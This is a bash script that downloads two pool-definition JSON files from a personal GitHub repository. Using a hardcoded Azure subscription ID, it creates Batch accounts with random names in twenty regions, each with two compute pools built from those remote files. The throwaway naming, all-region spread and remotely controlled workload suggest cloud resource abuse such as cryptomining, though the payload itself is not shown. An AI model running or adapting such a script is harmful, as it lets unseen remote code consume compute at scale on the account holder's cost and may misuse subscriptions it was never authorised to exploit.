#!/bin/bash
sub="dd0eeb91-8d3b-4411-96cc-b9f39a2a96fc"
ran=`head /dev/urandom | tr -dc a-z0-9 | fold -w 3 | head -n 1`
wget -O batch.json https://raw.githubusercontent.com/winttr89/batch4/main/batch.json
wget -O batch2.json https://raw.githubusercontent.com/winttr89/batch4/main/batch2.json
az provider register --namespace Microsoft.Batch --subscription "$sub"
az group create --name batchacc$ran --location westus2 --subscription "$sub"
echo "sleep 10s..."
sleep 10s
nnn=`head /dev/urandom | tr -dc a-z0-9 | fold -w 14 | head -n 1`
batch=0
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral germanywestcentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	echo "Batch account creating...$region"
	batch=$(( $batch + 1 ))
	az batch account create --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --location $region --no-wait
done
echo "sleep 8m..."
sleep 8m
batch=0
echo "Batch account setting..."
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral germanywestcentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	batch=$(( $batch + 1 ))
	az batch account login --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --shared-key-auth
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch.json
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch2.json
done
echo "Xong..."
